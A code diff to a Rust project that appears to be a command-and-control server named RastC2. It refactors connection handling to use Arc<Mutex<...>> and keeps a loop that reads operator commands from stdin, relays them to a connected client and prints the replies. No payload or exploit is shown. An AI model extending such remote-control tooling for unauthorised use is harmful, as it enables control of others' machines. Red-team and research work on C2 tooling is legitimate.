@@ -1,4 +1,8 @@
-use std::{net::SocketAddr, sync::Arc, vec};
+use std::{
+    net::SocketAddr,
+    sync::{Arc, Mutex},
+    vec,
+};
 
 use anyhow::{Error, Result};
 use bidirectional_channel::{bounded, ReceivedRequest, Requester, Responder};
@@ -31,8 +35,8 @@ pub enum C2Notification {
 
 pub struct RastC2 {
     servers: Vec<JoinHandle<()>>,
-    connections: Vec<(SocketAddr, Arc<ProtoConnectionType>)>,
-    connections_rx: UnboundedReceiver<Arc<ProtoConnectionType>>,
+    connections: Vec<(SocketAddr, Arc<Mutex<ProtoConnectionType>>)>,
+    connections_rx: UnboundedReceiver<Arc<Mutex<ProtoConnectionType>>>,
     ui: Option<UiManager>,
     ui_rx: Option<Responder<ReceivedRequest<UiRequest, Dummy>>>,
 }
@@ -92,8 +96,8 @@ impl RastC2 {
         }
     }
 
-    async fn add_connection(&mut self, conn: Arc<ProtoConnectionType>) -> Result<()> {
-        let ip = conn.get_ip()?;
+    async fn add_connection(&mut self, conn: Arc<Mutex<ProtoConnectionType>>) -> Result<()> {
+        let ip = conn.lock().unwrap().get_ip()?;
         if self.ui.is_some() {
             self.ui
                 .as_ref()
@@ -110,7 +114,7 @@ impl RastC2 {
         Ok(())
     }
 
-    async fn _handle_connection(mut conn: Arc<ProtoConnectionType>) -> Result<()> {
+    async fn _handle_connection(conn: Arc<Mutex<ProtoConnectionType>>) -> Result<()> {
         // let msg_r = conn.recv().await?;
         // println!("Message received: {}", msg_r);
 
@@ -120,8 +124,9 @@ impl RastC2 {
             if let Ok(n) = stdin.read_line(&mut cmd) {
                 if n > 0 {
                     let msg = create_message(&cmd);
-                    Arc::get_mut(&mut conn).unwrap().send(msg).await?;
-                    let msg_r = Arc::get_mut(&mut conn).unwrap().recv().await?;
+                    let mut conn = conn.lock().unwrap();
+                    conn.send(msg).await?;
+                    let msg_r = conn.recv().await?;
                     let msg_r = get_message(msg_r)?;
                     let msg_r = msg_r.trim_end_matches('\0');
                     println!("{}", msg_r);
